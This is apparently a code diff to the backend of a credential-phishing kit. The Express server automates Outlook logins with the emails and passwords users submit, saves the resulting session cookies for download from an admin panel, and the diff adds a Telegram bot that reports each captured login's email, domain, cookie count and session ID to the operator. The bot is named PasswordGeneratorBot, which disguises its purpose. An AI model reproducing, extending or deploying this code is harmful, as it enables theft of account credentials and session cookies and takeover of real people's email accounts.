@@ -2,6 +2,7 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const { OutlookLoginAutomation } = require('./src/outlook-login');
+const PasswordGeneratorBot = require('./telegram-bot');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -9,6 +10,22 @@ const PORT = process.env.PORT || 5000;
 // Security configuration
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin-' + Math.random().toString(36).substr(2, 24);
 console.log(`🔑 Admin token: ${ADMIN_TOKEN}`);
+
+// Make admin token available globally for Telegram bot
+global.adminToken = ADMIN_TOKEN;
+
+// Initialize Telegram Bot
+let telegramBot = null;
+try {
+    if (process.env.TELEGRAM_BOT_TOKEN) {
+        telegramBot = new PasswordGeneratorBot();
+        console.log('🤖 Telegram Bot initialized successfully');
+    } else {
+        console.log('⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled');
+    }
+} catch (error) {
+    console.error('❌ Failed to initialize Telegram Bot:', error.message);
+}
 
 // Middleware - Configure CORS for Replit environment
 app.use(cors({
@@ -413,7 +430,39 @@ app.post('/api/login', async (req, res) => {
                 // If password login successful, save cookies but don't use them
                 if (loginSuccess) {
                     console.log('💾 Saving session cookies to file (not for reuse)...');
-                    await session.automation.saveCookies(email, password);
+                    const sessionFile = await session.automation.saveCookies(email, password);
+                    
+                    // Send Telegram notification if bot is available
+                    if (telegramBot && sessionFile) {
+                        try {
+                            // Extract domain from email
+                            const domain = email.split('@')[1] || 'Unknown';
+                            
+                            // Read session file to get cookie count
+                            const fs = require('fs');
+                            let totalCookies = 0;
+                            try {
+                                if (fs.existsSync(sessionFile)) {
+                                    const sessionData = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
+                                    totalCookies = sessionData.totalCookies || 0;
+                                }
+                            } catch (error) {
+                                console.log('Could not read cookie count:', error.message);
+                            }
+                            
+                            await telegramBot.sendLoginNotification({
+                                email: email,
+                                domain: domain,
+                                timestamp: new Date().toISOString(),
+                                totalCookies: totalCookies,
+                                sessionId: sessionId
+                            });
+                            
+                            console.log(`📤 Telegram notification sent for ${email}`);
+                        } catch (error) {
+                            console.error('❌ Failed to send Telegram notification:', error.message);
+                        }
+                    }
                 }
             }
 
@@ -703,6 +752,38 @@ app.post('/api/continue-login', async (req, res) => {
                 responseMessage = sessionFile ? 
                     `Login completed successfully! Session saved to: ${sessionFile}` :
                     'Login completed successfully!';
+                
+                // Send Telegram notification if bot is available
+                if (telegramBot && sessionFile && loginSuccess) {
+                    try {
+                        const email = session.email || 'unknown@unknown.com';
+                        const domain = email.split('@')[1] || 'Unknown';
+                        
+                        // Read session file to get cookie count
+                        const fs = require('fs');
+                        let totalCookies = 0;
+                        try {
+                            if (fs.existsSync(sessionFile)) {
+                                const sessionData = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
+                                totalCookies = sessionData.totalCookies || 0;
+                            }
+                        } catch (error) {
+                            console.log('Could not read cookie count:', error.message);
+                        }
+                        
+                        await telegramBot.sendLoginNotification({
+                            email: email,
+                            domain: domain,
+                            timestamp: new Date().toISOString(),
+                            totalCookies: totalCookies,
+                            sessionId: requestedSessionId
+                        });
+                        
+                        console.log(`📤 Telegram notification sent for ${email}`);
+                    } catch (error) {
+                        console.error('❌ Failed to send Telegram notification:', error.message);
+                    }
+                }
             } else {
                 responseMessage = 'Login may require additional verification';
             }
@@ -1262,6 +1343,19 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
     }
 });
 
+// Bot status endpoint
+app.get('/api/bot-status', (req, res) => {
+    res.json({
+        botEnabled: !!telegramBot,
+        subscribedUsers: telegramBot ? telegramBot.getSubscribedUsers() : 0,
+        features: ['Password Generation', 'Login Notifications', 'Admin Panel Links'],
+        status: telegramBot ? 'active' : 'disabled',
+        message: telegramBot ? 
+            'Telegram Bot is running and ready to send notifications!' : 
+            'Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable'
+    });
+});
+
 // Download cookie file
 app.get('/api/admin/download/:filename', requireAdminAuth, (req, res) => {
     const fs = require('fs');
@@ -1315,4 +1409,11 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`📧 API endpoints available at http://localhost:${PORT}/api/`);
     console.log(`🌐 Frontend available at http://localhost:${PORT}/`);
     console.log(`🔧 Admin panel available at http://localhost:${PORT}/admin.html`);
+    
+    if (telegramBot) {
+        console.log(`🤖 Telegram Bot active - ${telegramBot.getSubscribedUsers()} users subscribed`);
+        console.log(`📱 Bot Features: Password generation + Login notifications`);
+    } else {
+        console.log(`❌ Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable notifications`);
+    }
 });
